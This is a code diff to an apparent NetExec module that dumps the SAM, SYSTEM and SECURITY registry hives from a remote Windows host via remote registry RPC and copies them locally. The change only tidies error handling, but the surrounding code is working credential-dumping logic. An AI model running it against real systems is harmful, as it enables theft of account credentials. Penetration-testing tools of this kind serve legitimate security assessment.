@@ -1,3 +1,4 @@
+import contextlib
 import os
 import datetime
 
@@ -37,10 +38,11 @@ class NXCModule:
         dce = rpc.get_dce_rpc()
         if connection.kerberos:
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
-        dce.connect()
-        dce.bind(rrp.MSRPC_UUID_RRP)
 
         try:
+            dce.connect()
+            dce.bind(rrp.MSRPC_UUID_RRP)
+
             for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                 hRootKey, subKey = self._strip_root_key(dce, hive)
                 outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}"
@@ -53,9 +55,11 @@ class NXCModule:
                     context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
                     return
         except (Exception, KeyboardInterrupt) as e:
-            context.log.fail(str(e))
+            context.log.fail(f"Unexpected error: {e}")
+            return
         finally:
-            dce.disconnect()
+            with contextlib.suppress(Exception):
+                dce.disconnect()
 
         # copy remote file to local
         log_path = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.".replace(":", "-"))
